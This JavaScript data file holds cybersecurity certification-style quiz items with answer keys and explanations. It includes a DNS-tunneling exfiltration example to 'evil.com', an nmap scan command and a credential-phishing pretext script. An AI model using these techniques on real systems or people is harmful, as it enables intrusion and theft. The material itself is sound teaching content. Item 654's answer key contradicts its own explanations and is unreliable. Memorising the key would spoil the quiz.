import { G, T, A, O, P } from './domains.js';

export const part6 = [
  {id:631,domain:O,question:"What is a cyber kill chain's 'Actions on Objectives' phase?",options:["Routine patch and vulnerability management tasks","Post-breach remediation like reimaging compromised systems","Legal proceedings brought against threat actors","The final phase where attackers achieve exfiltration or destruction"],answer:3,explanation:"APT attackers may spend months in earlier kill chain phases before executing their final objective — detecting attacks in earlier phases is critical to preventing the most damaging outcomes.",optionExplanations:["Routine IT tasks are ongoing operations, not a kill chain phase.","Remediation is defender activity after containment, not the attacker's final objective phase.","Legal proceedings are a post-incident organizational response, not a kill chain phase.","Actions on Objectives is the final phase where attackers achieve their goal."]},
  {id:632,domain:T,question:"What is a heap spray attack?",options:["Applying anti-static protective coatings to hardware","Distributing varied payloads across many allocations","Exhausting heap memory to deny service","Filling heap memory with shellcode"],answer:3,explanation:"Heap sprays fill memory with NOP sleds leading to shellcode — making precise address prediction unnecessary by creating a large landing zone for overflowed pointers.",optionExplanations:["Anti-static coating is physical hardware protection, unrelated to memory exploitation.","Distributing varied payloads describes a different evasion technique, not heap spraying.","Heap exhaustion causes denial of service, a different goal than landing shellcode.","Heap spraying fills memory with shellcode to increase exploit success odds."]},
  {id:633,domain:A,question:"What is a unified threat management (UTM) device?",options:["A centralized manager for network infrastructure","A platform aggregating threat intelligence feeds","A unified console for SOC operations","One appliance combining firewall, IPS, VPN, and antivirus"],answer:3,explanation:"UTM appliances (Fortinet FortiGate, SonicWall) simplify security for mid-size organizations — one vendor, one console, integrated updates — but create a single point of failure.",optionExplanations:["Infrastructure management configures devices, not integrated security enforcement.","Threat intel aggregation is one input, not the integrated appliance itself.","SOC operational consoles are management tools, not the security appliance.","A UTM combines multiple security functions into a single appliance."]},
  {id:634,domain:P,question:"What is processing sensitive personal data under GDPR Article 9?",options:["Data belonging to high-profile public figures","Any operation performed on any EU citizen's data","High-throughput processing of petabyte-scale data","Special categories like health or biometric data"],answer:3,explanation:"Article 9 special categories require explicit consent or other specific conditions (employment law, vital interests) — processing health data for marketing without explicit consent is a serious GDPR violation.",optionExplanations:["Public figure status doesn't determine Article 9 applicability; data type does.","General EU personal data processing falls under Article 6, not Article 9's special categories.","Large-scale processing volume is unrelated to the sensitivity-based Article 9 categories.","Article 9 covers special categories like health, biometric, and racial data."]},
  {id:635,domain:G,question:"What is AES (Advanced Encryption Standard)?",options:["An elliptic-curve public-key cryptosystem meant to replace RSA","A symmetric cipher classified by the NSA for government use only","A cipher used for tracking APT groups","The 2001 US federal symmetric cipher standard"],answer:3,explanation:"AES-256 is used in TLS, disk encryption (BitLocker, FileVault), VPNs, and secure communications — NIST selected it through an open public competition after DES became inadequate.",optionExplanations:["AES is symmetric, not an elliptic-curve public-key algorithm replacing RSA.","AES was publicly selected via NIST's open competition, not developed secretly by the NSA.","AES has no specific connection to APT attribution tracking.","AES was adopted in 2001 as the US federal symmetric cipher standard."]},
  {id:636,domain:T,question:"What is a kernel exploit?",options:["Malicious code targeting database management system internals","Privilege escalation to ring-0 kernel access","Malware targeting agricultural automation software","A hypervisor escape gaining control of the host"],answer:1,explanation:"Kernel exploits (like EternalBlue exploiting MS17-010 in the Windows SMB kernel driver) provide ring 0 access — attackers can do anything: install rootkits, bypass all security controls.",optionExplanations:["Database engine exploits target DBMS software, not the OS kernel.","Kernel exploits achieve ring-0 privilege escalation within the operating system.","Agricultural software exploits are an unrelated domain from kernel exploitation.","Hypervisor escapes target the virtualization layer, a different privilege boundary than the OS kernel."]},
  {id:637,domain:A,question:"What is a network intrusion prevention system (NIPS) signature?",options:["A pattern rule matching known attack patterns","A handwritten change-authorization document","A cryptographic hash verifying packet origin","A vendor software licensing agreement"],answer:0,explanation:"NIPS signatures match packet content, protocol anomalies, or behavioral patterns against a database of known attacks — detecting and blocking SQL injection attempts, shellcode patterns, etc.",optionExplanations:["A NIPS signature is a pattern rule identifying known attacks in traffic.","Change authorization documents are IT process controls, unrelated to detection signatures.","Cryptographic packet authentication is a different mechanism from pattern-matching signatures.","Software licenses are commercial agreements, unrelated to detection content."]},
  {id:638,domain:O,question:"What is a security maturity model?",options:["A rating system assigned by independent security testing labs","A framework measuring practice sophistication and consistency","A lifecycle tracker for security hardware devices","An org chart of analyst career paths"],answer:1,explanation:"CMMC, C2M2, and NIST CSF maturity levels (1-5) enable organizations to assess current capability and define a roadmap to higher maturity — with level 5 representing continuous improvement.",optionExplanations:["Lab ratings evaluate products, not organizational security program maturity.","A maturity model measures how sophisticated and consistent security practices are.","Hardware lifecycle tracking is asset management, not maturity assessment.","Career progression charts are HR structures, unrelated to security maturity."]},
  {id:639,domain:T,question:"What is a watering hole attack's target selection strategy?",options:["Choosing sites the target group frequently visits","Researching physical conference venues in person","Scanning for any exploitable website online","Prioritizing sites with the most CVEs"],answer:0,explanation:"Nation-state APTs research targets' internet behavior (through OSINT, prior access) to identify their 'virtual watering holes' — security conference sites, defense contractor portals, industry news sites.",optionExplanations:["Attackers select sites the specific target group actually visits.","Physical venue research supports in-person social engineering, not site selection for watering holes.","Opportunistic scanning ignores who visits a site, unlike targeted watering hole selection.","Choosing by vulnerability count prioritizes ease over relevance to the actual target."]},
  {id:640,domain:G,question:"What is the significance of key length in cryptography?",options:["Longer keys always add major computational overhead","Larger key space defeats brute force","128-bit and 256-bit keys are equally secure","Key length affects only encryption throughput speed"],answer:1,explanation:"AES-128 has 2^128 possible keys — more than the number of atoms in the observable universe — making brute force impossible with current and foreseeable technology.",optionExplanations:["Overhead exists but is secondary to the exponential key-space growth that matters most.","Longer keys exponentially expand the key space, making brute force infeasible.","Longer keys provide larger security margins, so they aren't simply equivalent.","Key length primarily determines security strength, not merely processing speed."]},
  {id:641,domain:T,question:"What is a security awareness phishing simulation?",options:["An academic lab research experiment","A tabletop response discussion exercise","Controlled exercises testing employee susceptibility to phishing","Testing email gateway filtering technology"],answer:2,explanation:"Phishing simulations measure click rates, credential submission rates, and reporting rates — showing training effectiveness and identifying employees who need additional coaching.",optionExplanations:["Academic research studies attacker techniques, not organizational employee training.","Tabletop exercises are discussion-based drills, not simulated phishing emails to staff.","Phishing simulations test real employee susceptibility and awareness training effectiveness.","Email gateway testing evaluates technology, not human behavior."]},
  {id:642,domain:A,question:"What is a deception network (honeynet)?",options:["A lab replicating production configs for testing tools","Interconnected honeypots luring and monitoring attackers","A machine-learning system detecting anomalous SDN traffic patterns","Deceptive marketing of network product claims"],answer:1,explanation:"Honeynets mimic entire network environments (corporate networks, industrial systems) — giving researchers and defenders detailed information about attacker TTPs, tools, and objectives.",optionExplanations:["Testing labs validate defenses; honeynets instead lure and monitor real attackers.","A honeynet is a network of honeypots designed to attract and study attackers.","AI-based anomaly detection is a real-time defense tool, not a decoy environment.","Deceptive marketing is a business ethics issue, unrelated to security research honeynets."]},
  {id:643,domain:O,question:"What is a compliance audit?",options:["Verifying required regulatory security controls","A review of financial statements and tax filings","Confirming software license counts match deployments","A review of employee dress-code compliance"],answer:0,explanation:"PCI DSS QSA audits, SOC 2 audits, HIPAA audits, and FedRAMP assessments verify specific required controls are implemented and functioning — results may be publicly shared with clients.",optionExplanations:["A compliance audit verifies that required regulatory or contractual controls are met.","Financial audits verify accounting accuracy, a different type of audit.","License counting is IT asset management, not a security compliance audit.","Dress code is an HR matter, unrelated to security compliance audits."]},
  {id:644,domain:P,question:"What is purpose specification in data collection?",options:["Stating the explicit reason for data collection","Assigning a descriptive sensitivity classification label to each file","Documenting database schema field use cases","A technical requirements document written by developers"],answer:0,explanation:"GDPR requires purposes to be stated before collection — 'collecting contact information for newsletter marketing and account notifications' is specific; 'for business purposes' is not.",optionExplanations:["Purpose specification requires stating the specific reason data is collected.","File sensitivity labeling is data governance, a separate concept from stating collection purpose.","Schema documentation is technical design, not a privacy purpose declaration.","Technical requirements documents describe architecture, not the legal purpose of collection."]},
  {id:645,domain:G,question:"What is elliptic-curve Diffie-Hellman (ECDH)?",options:["An elliptic-curve signing key pair only","An elliptic-curve protocol establishing a shared secret key","Deriving symmetric keys via a KDF","Routing packets through elliptical topologies"],answer:1,explanation:"ECDH (specifically ECDHE for ephemeral/forward secrecy) is used in TLS 1.3 — providing key exchange with smaller key sizes than RSA/DHE, enabling faster handshakes on mobile and constrained devices.",optionExplanations:["Signing key pairs describe ECDSA, not the key-exchange purpose of ECDH.","ECDH uses elliptic-curve math to let two parties establish a shared secret.","Key derivation functions process the ECDH output, but aren't ECDH itself.","Network topology shapes have no role in this cryptographic key-exchange protocol."]},
  {id:646,domain:T,question:"What is a pivot in penetration testing?",options:["Switching from automated scanning to manual exploitation","Tailgating between physically secured facility areas","Relaying through a compromised host","Adjusting methodology when initial attacks fail"],answer:2,explanation:"Pivoting enables reaching segmented networks — from internet-accessible web server, pivot to internal app server, pivot to database server, pivot to domain controller.",optionExplanations:["Shifting testing phases is methodology, not the specific technique of pivoting.","Tailgating is a physical social-engineering technique, unrelated to network pivoting.","Pivoting uses a compromised host as a relay to reach isolated systems.","General methodology adjustment is broader than the specific network-relay technique of pivoting."]},
  {id:647,domain:A,question:"What is network access control 802.1X?",options:["A WPA protocol encrypting wireless traffic with AES","A 10-gigabit Ethernet physical-layer specification","Port-based access control requiring EAP authentication","The 802.11 Wi-Fi MAC and PHY standard"],answer:2,explanation:"802.1X authenticates devices before granting network access — unathenticated devices are placed in a restricted VLAN, preventing unauthorized devices from accessing corporate networks.",optionExplanations:["WPA is a separate wireless encryption protocol from the underlying 802.1X access control.","10GbE defines throughput standards, unrelated to authentication-based access control.","802.1X provides port-based access control using EAP authentication.","802.11 defines Wi-Fi networking itself, a separate standard from 802.1X access control."]},
  {id:648,domain:O,question:"What is evidence preservation in digital forensics?",options:["Capturing exact, tamper-proof copies admissible in court","Chemical fixatives applied to biological samples","Redundant backups made for disaster recovery","Storing vulnerability findings without capturing state"],answer:0,explanation:"Forensic images (dd, FTK Imager) create bit-for-bit copies; hash values (MD5, SHA-256) verify the copy is exact — any alteration changes the hash and is immediately detectable.",optionExplanations:["Evidence preservation creates verified, unaltered copies admissible in legal proceedings.","Chemical fixation preserves biological samples, unrelated to digital forensic evidence.","Business continuity backups focus on availability, not evidential integrity for legal use.","Vulnerability documentation records findings but doesn't capture live system state as evidence."]},
  {id:649,domain:T,question:"What is an application-layer DDoS attack?",options:["Blocked by application-aware deep packet inspection firewalls","Expensive HTTP requests overwhelming app resources","A memory-corruption crash of the server process","Amplification via HTTP/2 or DNS protocol features"],answer:1,explanation:"HTTP floods, Slowloris, and RUDY (R-U-Dead-Yet) target application resources rather than bandwidth — even low-rate attacks can overwhelm servers by triggering expensive database queries.",optionExplanations:["Being filtered describes a defense outcome, not the attack technique's definition.","Layer 7 DDoS sends costly, legitimate-looking requests to overwhelm app resources.","Memory corruption is an application vulnerability, not this resource-exhaustion technique.","Protocol amplification is a specific mechanism, broader than general Layer 7 resource exhaustion."]},
  {id:650,domain:G,question:"What is a hybrid cryptosystem?",options:["Selecting different ciphers based on data sensitivity","Asymmetric key exchange plus symmetric encryption","Splitting key storage between HSMs and cloud","Running legacy and modern ciphers together"],answer:1,explanation:"TLS, PGP, S/MIME all use hybrid cryptography — RSA or ECDH to exchange an AES key, then AES-GCM for bulk data — getting both the key management benefits of asymmetric and the speed of symmetric.",optionExplanations:["Algorithm selection by data classification is a policy choice, not a hybrid cryptosystem.","A hybrid cryptosystem uses asymmetric key exchange with symmetric bulk encryption.","Split key storage architecture describes deployment, not the combination of crypto types.","Running two ciphers in parallel is a migration strategy, not a hybrid cryptosystem."]},
  {id:651,domain:O,question:"What is the difference between vulnerability scanning tools and manual security testing?",options:["Scanners can discover every possible security flaw","Scanners are exhaustive and produce no false positives","Scanners cover broadly; testers find logic flaws","Manual testing alone is perfectly accurate"],answer:2,explanation:"Automated tools find the 'low-hanging fruit' efficiently; skilled pentesters find authentication bypass through business logic flaws, privilege escalation through parameter manipulation, and novel attack chains.",optionExplanations:["Scanners miss business logic and context-dependent flaws, so they aren't exhaustive.","Scanners do produce false positives and lack full coverage of complex vulnerabilities.","Scanners cover broad attack surface quickly, while testers find complex chained flaws.","Manual testing has value but isn't perfectly accurate or scalable on its own."]},
  {id:652,domain:T,question:"What is a multi-stage attack?",options:["Sequential phases from initial access to lateral movement","Slow brute force to avoid lockouts","Multiple actor groups working jointly","DDoS traffic spread across many targets"],answer:0,explanation:"APT attacks are inherently multi-stage — initial phishing provides access, persistence survives detection attempts, lateral movement reaches valuable assets, and privilege escalation enables exfiltration.",optionExplanations:["Multi-stage attacks proceed through sequential phases building on prior success.","Slow credential stuffing is a specific evasion technique, not multi-stage attack structure.","Multiple coordinated actors describe collaboration, not the sequential-phase nature of these attacks.","Distributing DDoS across targets describes breadth, not sequential attack phases."]},
  {id:653,domain:A,question:"What is security automation?",options:["Automating tasks like triage and threat detection","Motion-triggered surveillance camera systems","AI-based hiring and recruitment tools","Auto-updating signatures and minor patches"],answer:0,explanation:"Security automation (Python scripts, SOAR playbooks, CI/CD security gates) is essential at enterprise scale — humans cannot manually review millions of events or respond quickly enough to automated attacks.",optionExplanations:["Security automation uses technology to perform tasks like triage and detection at scale.","Physical surveillance automation is a facilities function, not cybersecurity automation.","Recruitment automation is an HR function, unrelated to security task automation.","Automatic signature updates are one narrow feature, not the broader concept of automation."]},
  {id:654,domain:P,question:"What is a legitimate interest balancing test?",options:["A cost-benefit analysis of privacy-control expense versus risk","Negotiating controller-processor responsibility allocation","Comparing data accuracy needs against privacy risk","Weighing legitimate interest against privacy rights"],answer:0,explanation:"The balancing test considers: how serious is the privacy impact? Would individuals reasonably expect this processing? Can the purpose be achieved with less privacy impact? The balance must clearly favor the controller.",optionExplanations:["Cost-benefit analysis addresses control economics, not the LIA's privacy-rights weighing.","Controller-processor negotiation is addressed in separate data processing agreements.","Data accuracy tradeoffs are a data governance concern, not the LIA balancing test.","The balancing test weighs an organization's legitimate interest against individual privacy rights."]},
  {id:655,domain:G,question:"What is a session key?",options:["A temporary key used for one session","A long-lived master key from which sessions derive","A temporary RFID card for visitor access","A long-lived key reused across sessions"],answer:0,explanation:"Session keys are ephemeral — TLS generates a new one for each connection using the negotiated key exchange, providing confidentiality for that session without reusing the long-term keys.",optionExplanations:["A session key is generated fresh for one session and then discarded.","A master key derives other keys but persists across many sessions, unlike a session key.","Physical visitor cards are unrelated to cryptographic session keys.","Reused long-term keys are master keys, the opposite of ephemeral session keys."]},
  {id:656,domain:T,question:"What is a pretexting phone call scenario?",options:["A roleplay exercise used during awareness training","Impersonation using a fabricated cover story","Calling from an untraceable prepaid burner phone","An automated robocall impersonation campaign"],answer:1,explanation:"'Hi, this is Dave from IT Security. We've detected suspicious activity on your account. I need to verify your credentials to protect your account' — a classic IT support pretexting scenario.",optionExplanations:["Training roleplay is a defensive exercise, not the actual attack technique.","Pretexting impersonates a trusted party using a fabricated cover story.","Using an untraceable phone is operational security, not the deception technique itself.","Automated robocalls can't adapt dynamically like live pretexting conversations can."]},
  {id:657,domain:A,question:"What is a mobile device management (MDM) system?",options:["A repository storing mobile app packages","Software to remotely configure, secure, and wipe devices","A billing platform for mobile carriers","An admin app for help-desk access"],answer:1,explanation:"MDM (Intune, Jamf, MobileIron) enforces encryption, screen lock, certificate installation, app restrictions, and enables remote wipe — essential for BYOD and corporate mobile security.",optionExplanations:["App repositories manage distribution, not the devices' security configuration.","MDM software remotely configures, secures, and wipes managed mobile devices.","Carrier billing platforms track costs, unrelated to device security management.","Help-desk admin apps are client tools, not the MDM management platform itself."]},
  {id:658,domain:O,question:"What is a security incident severity classification?",options:["Grouping incidents by the known threat-actor group involved","Categorizing incidents by impact and urgency","A medical triage protocol for physical injuries","A CVSS-style scoring method for vulnerabilities"],answer:1,explanation:"Severity tiers (P1: critical breach in progress, P2: active intrusion, P3: malware detected, P4: policy violation) determine response time SLAs and escalation paths.",optionExplanations:["Threat attribution identifies who's responsible, not how urgently to respond.","Severity classification prioritizes incidents by business impact and response urgency.","Medical triage addresses physical injuries, unrelated to cybersecurity incident classification.","CVSS scores individual vulnerabilities, not the severity of an active incident."]},
  {id:659,domain:T,question:"What is a threat actor's motivation and why does it matter for defense?",options:["Motivation is irrelevant to technical defense planning","Predicting targets and techniques by motive","All threat actors use an identical toolkit","Relevant only to post-incident law-enforcement attribution"],answer:1,explanation:"Nation-states persist for months targeting IP; criminals move quickly for financial gain; hacktivists target reputation. Different motivations mean different defenses are most relevant.",optionExplanations:["Motivation directly shapes targeting and technique choice, making it relevant to defense.","Understanding motivation helps predict targets, techniques, and persistence level.","Different threat actors use markedly different TTPs based on their motivation.","Motivation analysis also informs proactive defensive prioritization, not just after-the-fact attribution."]},
  {id:660,domain:G,question:"What is cryptographic agility?",options:["Renegotiating the active TLS cipher suite mid-session","A high-speed protocol transporting keys across networks","Designing systems to swap algorithms easily","Applying agile sprints to crypto library releases"],answer:2,explanation:"Cryptographic agility is crucial for post-quantum migration — systems that hardcoded SHA-1 or MD5 faced expensive rewrites when those algorithms were broken.",optionExplanations:["Mid-session renegotiation is a specific TLS feature, not the broader agility principle.","Key transport protocols address distribution, not the architectural ability to replace algorithms.","Cryptographic agility is designing systems so algorithms can be swapped easily.","Agile development methodology is a process approach, not a cryptographic design principle."]},
  {id:661,domain:T,question:"What is a SQL injection UNION attack?",options:["Creating foreign-key joins across separate schemas","Running parallel injection payloads at once","Appending UNION SELECT statements to pull other tables' data","Merging the schemas of two separate servers"],answer:2,explanation:"UNION attacks require matching column count and data types — but enable extracting usernames, passwords, and sensitive data from any table in the database the web application user can access.",optionExplanations:["Foreign key creation is database design, unrelated to this injection technique.","Parallel payload execution describes a different exploitation approach, not UNION-based extraction.","UNION attacks append UNION SELECT statements to extract data from other tables.","Merging separate database servers is an administrative task, not a UNION injection."]},
  {id:662,domain:A,question:"What is a container security scanner?",options:["A runtime sidecar agent monitoring system calls live","A barcode scanner for data-center rack inventory","Scanning images for known CVEs pre-deployment","Real-time monitoring of running container processes"],answer:2,explanation:"Container scanners (Trivy, Snyk Container, Twistlock) check images against CVE databases in CI/CD pipelines — blocking deployment of containers with critical vulnerabilities.",optionExplanations:["Runtime sidecar monitoring watches live behavior, distinct from static pre-deployment scanning.","Physical barcode scanning is hardware inventory tracking, unrelated to container security.","Container scanners analyze images for known vulnerabilities before deployment.","Real-time process monitoring is runtime security, a different tool than image scanning."]},
  {id:663,domain:O,question:"What is a security training program's effectiveness measurement?",options:["Tracking behavior change like phishing-click rates","Counting employees who complete mandatory annual modules","Comparing cost per employee training hour","Counting available courses, videos, and quizzes"],answer:0,explanation:"Effective training measurement tracks phishing simulation click rates before and after training, password audit results, and reported incident volume — demonstrating behavioral change, not just completion.",optionExplanations:["Effective measurement tracks actual behavior change, not just participation.","Completion counts show compliance, not whether behavior actually improved.","Cost-per-hour measures procurement value, not training effectiveness.","Content catalog size measures program breadth, not whether it changes behavior."]},
  {id:664,domain:P,question:"What is the right to data portability under GDPR?",options:["Physically relocating stored data to another data-center region","IT migrating data between database vendors","Receiving data to transmit to another provider","Delivering data on physical USB drives"],answer:2,explanation:"GDPR Article 20 enables 'competitive portability' — you can take your fitness app data history to a competitor app without having to manually re-enter years of data.",optionExplanations:["Physical relocation of infrastructure is unrelated to this individual data-subject right.","Organizational data migration is an IT operations matter, not a personal right.","Data portability lets individuals receive and transmit their data to another provider.","Physical media delivery is only one possible format, not the defining right itself."]},
  {id:665,domain:G,question:"What is FIPS 140-2/140-3 validation?",options:["A voluntary NIST risk-management framework","Security requirements for validating cryptographic hardware and software modules","A firewall throughput performance benchmark","Minimum processing rates for data centers"],answer:1,explanation:"FIPS 140-2 levels range from 1 (software-only acceptable) to 4 (tamper-responsive physical security) — federal agencies require FIPS-validated modules for protecting sensitive-but-unclassified information.",optionExplanations:["NIST CSF is a separate risk framework, not this cryptographic module validation standard.","FIPS 140-2/3 sets security requirements for validating cryptographic modules.","Firewall throughput benchmarks test performance, unrelated to cryptographic module validation.","Data center processing rate standards are unrelated to cryptographic security validation."]},
  {id:666,domain:T,question:"What is a network scanner's purpose in attack reconnaissance?",options:["Discovering live hosts, ports, and services","An RF and X-ray hardware inspection tool","A physical inspection of the data-center cable plant","Filtering email by sender-domain reputation"],answer:0,explanation:"Nmap is the quintessential network scanner — 'nmap -sV -O target.com' identifies open ports, service versions, and OS, creating the target profile for subsequent attack phases.",optionExplanations:["Network scanners discover hosts, ports, and services to map the attack surface.","Hardware implant detection uses physical inspection tools, unrelated to network scanning.","Physical cable inspection is infrastructure documentation, not a network reconnaissance tool.","Email filtering inspects messages, unrelated to network host and port discovery."]},
  {id:667,domain:A,question:"What is a cloud-native application protection platform (CNAPP)?",options:["A portal for configuring IAM and billing controls","A development framework for building cloud-native microservices","A platform combining CSPM and CWPP","A cloud WAF blocking volumetric DDoS traffic"],answer:2,explanation:"CNAPPs (Wiz, Orca Security, Palo Alto Prisma Cloud) provide end-to-end visibility — from code scanning through runtime protection — addressing the fragmented cloud security tool landscape.",optionExplanations:["Cloud administration portals manage resources, not integrated cloud-native application security.","Development frameworks address application architecture, not the security platform category.","CNAPP integrates CSPM, CWPP, and other capabilities for cloud-native security.","Cloud WAF and DDoS scrubbing address specific attacks, not the full CNAPP scope."]},
  {id:668,domain:O,question:"What is a security operations maturity assessment?",options:["A competency evaluation of individual analyst skills for promotion","Evaluating people, process, and technology maturity","Comparing SIEM and SOAR vendor products","Auditing physical access to the SOC facility"],answer:1,explanation:"SOC assessments evaluate detection coverage (% of MITRE ATT&CK covered), response time metrics, analyst skills, tool integration, and process documentation — identifying gaps for improvement.",optionExplanations:["Individual skill evaluation is HR performance management, not SOC-wide maturity assessment.","A SOC maturity assessment evaluates people, process, and technology capabilities together.","Vendor product comparison is procurement evaluation, not organizational maturity assessment.","Physical facility access audits address building security, not operational maturity."]},
  {id:669,domain:T,question:"What is an on-path attacker (formerly man-in-the-middle)?",options:["An attacker positioned to intercept and modify traffic between parties","A tester simulating on-path attacks","An insider eavesdropping near executives","An attacker limited to on-premises systems"],answer:0,explanation:"On-path attacks (ARP poisoning, rogue AP, BGP hijacking) place the attacker inline in network traffic flows — the new preferred term per CompTIA to avoid gender-specific language.",optionExplanations:["An on-path attacker sits in the communication path, intercepting and modifying traffic.","Testers simulating attacks evaluate defenses; the on-path attacker is the actual threat actor.","Physical eavesdropping near people describes shoulder surfing, not network positioning.","On-premises scope preference is unrelated to the network-positioning concept of being on-path."]},
  {id:670,domain:G,question:"What is SP 800-53?",options:["A fictional 800 Mbps network protocol spec","A fictional protocol enforcing exactly 53 controls","NIST's catalog of security controls","A classification scheme for sensitive documents"],answer:2,explanation:"NIST SP 800-53 Rev 5 provides ~1,000 controls in 20 families — used by federal agencies (required by FISMA) and widely referenced by private sector organizations building security programs.",optionExplanations:["SP 800-53 isn't a network speed protocol; it's a NIST security control catalog.","The '53' is just the publication number, not a fixed control count.","SP 800-53 is NIST's comprehensive catalog of security and privacy controls.","Classification handling standards are separate NIST/government documents from this control catalog."]},
  {id:671,domain:T,question:"What is a birthday attack's application to digital signatures?",options:["Backdating a signature's timestamp to appear valid","Two colliding messages sharing one signature","Transferring a valid signature via hash collision","Guessing PINs from a target's birthday"],answer:1,explanation:"If an attacker can find M1 and M2 where hash(M1)=hash(M2), they can get M1 legitimately signed, then substitute M2 with the same signature — forging a signature on a fraudulent document.",optionExplanations:["Timestamp backdating exploits time-related weaknesses, unrelated to hash collision forgery.","A birthday attack finds two messages sharing a hash so one signature validates both.","This describes a similar idea but less precisely than the exact hash-collision mechanism.","Guessing PINs from birthdays is a social-engineering password attack, unrelated to cryptography."]},
  {id:672,domain:A,question:"What is the principle of secure by design?",options:["Requiring two independent reviewers approve every design","Hardened physical barriers at entry points","Encrypted storage of design documents","Building security in from the start"],answer:3,explanation:"Secure by design avoids the expensive retrofitting of security — SQL injection prevention built into the query API is cheaper than patching it in thousands of code locations.",optionExplanations:["Two-person review is a process control, not the architectural secure-by-design principle.","Physical barrier hardening is a facilities concern, unrelated to system architecture design.","Encrypting design documents protects confidentiality, not the systems being designed.","Secure by design builds security into architecture from the beginning."]},
  {id:673,domain:O,question:"What is an information security policy's relationship to security culture?",options:["Well-documented policies alone are sufficient for full compliance","Policies created only after culture fails","Culture spontaneously generates written policy","Culture determines whether policies are followed"],answer:3,explanation:"Organizations with strong security culture don't just follow policies because they have to — employees report suspicious emails, question unusual requests, and consider security in decisions without being reminded.",optionExplanations:["Policies alone don't guarantee compliance without culture reinforcing them.","Policies should be proactive requirements, not reactive to cultural failure.","Culture can influence policy, but written policies require deliberate creation by management.","Security culture determines whether documented policies are actually followed."]},
  {id:674,domain:P,question:"What is a privacy-by-design principle in technical systems?",options:["A curriculum teaching officers to review designs","Treating privacy controls as optional add-ons","Making privacy settings visible in the UI","Embedding privacy as the default setting"],answer:3,explanation:"Privacy by design (Ann Cavoukian's 7 principles) includes: proactive not reactive, privacy as default, full functionality, end-to-end security, visibility, respect for user privacy, and embedded into design.",optionExplanations:["DPO training builds individual expertise, not the broader design principle itself.","Optional privacy contradicts the principle, which requires privacy as the automatic default.","UI visibility improves transparency but isn't the core embedding-by-default principle.","Privacy by design embeds privacy controls as the default from the start."]},
  {id:675,domain:G,question:"What is a cryptographic key agreement protocol?",options:["Two parties independently deriving the same shared secret","A written agreement on algorithms used","A KDC distributing encrypted symmetric keys","A vendor contract for key management"],answer:0,explanation:"Diffie-Hellman and ECDH are key agreement protocols — both parties contribute values, perform mathematics, and independently derive the same secret without it ever traversing the network.",optionExplanations:["Key agreement lets two parties independently derive an identical shared secret.","Algorithm agreements are administrative documents, not the cryptographic protocol itself.","KDC-based distribution is a key transport model, different from key agreement.","Vendor contracts govern operational procedures, unrelated to the cryptographic mechanism."]},
  {id:676,domain:T,question:"What is an exfiltration technique using DNS tunneling?",options:["Routing all traffic through DNS server hardware","Querying DNS records to enumerate infrastructure hostnames","Encoding stolen data in DNS queries","Stealing zone-transfer records from DNS"],answer:2,explanation:"DNS tunneling encodes data in subdomain labels (base64 encoded data becomes 'c3RvbGVuZGF0YQ.evil.com') — each DNS query carries a data payload, slowly exfiltrating data through firewall-allowed DNS traffic.",optionExplanations:["Routing traffic through DNS hardware is a performance concept, unrelated to data exfiltration.","DNS enumeration is reconnaissance, a separate technique from encoding stolen data.","DNS tunneling encodes stolen data within DNS queries to exfiltrate it covertly.","Zone-transfer theft steals infrastructure mapping data, not arbitrary exfiltrated content."]},
  {id:677,domain:A,question:"What is a security zone in network design?",options:["A restricted physical area for SOC staff","A network segment grouped by shared trust level and policy","A jurisdiction with special data-protection laws","Synchronized time zones for SIEM logs"],answer:1,explanation:"Typical zones: Internet (untrusted) → DMZ (semi-trusted, public services) → Internal (trusted, user systems) → Restricted (highest trust, sensitive data). Each boundary has controls.",optionExplanations:["Restricted physical work areas are facility security, not logical network segmentation.","A security zone groups devices by trust level with controlled inter-zone access.","Regulatory jurisdictions define legal requirements, unrelated to network segmentation.","SIEM timestamp synchronization is log management, unrelated to network security zones."]},
  {id:678,domain:O,question:"What is lateral movement detection?",options:["Motion sensors and cameras detecting physical intrusion","Spotting attackers moving between internal systems","Tracking relocated physical hardware assets","Badge logs of restricted room access"],answer:1,explanation:"Lateral movement detection looks for: admin tool usage from unusual sources, authentication to previously unaccessed systems, anomalous RDP/SMB connections, and pass-the-hash patterns.",optionExplanations:["Physical intrusion detection monitors facility access, not network-based attacker movement.","Lateral movement detection spots attackers moving between compromised internal systems.","Asset location tracking is facilities management, unrelated to network attacker movement.","Physical badge logs track human entry, not digital lateral movement patterns."]},
  {id:679,domain:T,question:"What is a cache poisoning attack?",options:["Injecting malicious SQL statements into cached query results","Overwriting heap or stack memory regions","Chemical sabotage of data-center cooling systems","Corrupting a DNS, web, or ARP cache"],answer:3,explanation:"DNS cache poisoning inserts fake records; ARP cache poisoning enables MitM attacks on local networks; web cache poisoning serves malicious responses to multiple users from a corrupted cache.",optionExplanations:["SQL injection into result caches is a database concern, distinct from this cache attack.","Heap or stack overwriting is a memory exploitation technique, not cache poisoning.","Physical sabotage is a kinetic attack, unrelated to logical cache corruption.","Cache poisoning inserts malicious data into DNS, web, or ARP caches."]},
  {id:680,domain:G,question:"What is the security implication of weak random number generation?",options:["Weak RNGs only affect password-hashing operations","Only causes minor, harmless statistical bias","Makes all cryptographic operations predictable","Slightly degrades symmetric key strength"],answer:2,explanation:"The Debian OpenSSL bug (2008) limited entropy to 32,768 possible values — all SSH keys generated on Debian/Ubuntu for 2 years were predictable, completely defeating their security.",optionExplanations:["Weak RNGs affect all randomness-dependent operations, not just password hashing.","Weak RNGs can catastrophically compromise security, not just introduce minor bias.","A predictable RNG makes all dependent cryptographic operations predictable, destroying security.","Weak RNGs can completely undermine security, not just slightly degrade it."]},
  {id:681,domain:O,question:"What is a disaster recovery test?",options:["A tabletop discussion without any failover","An evacuation and fire-drill exercise","Actually executing recovery to verify RTO and RPO","A documentation walkthrough review only"],answer:2,explanation:"Without testing, DRPs are untested assumptions — a test might reveal that the database backup is 3 weeks old, the restoration procedure is outdated, or the target RTO is impossible with current infrastructure.",optionExplanations:["Tabletop exercises are discussion-based, without activating actual recovery infrastructure.","Fire and evacuation drills address physical safety, not IT recovery validation.","A DR test actually executes recovery procedures to verify RTO/RPO targets.","Documentation walkthroughs review procedures without activating live recovery systems."]},
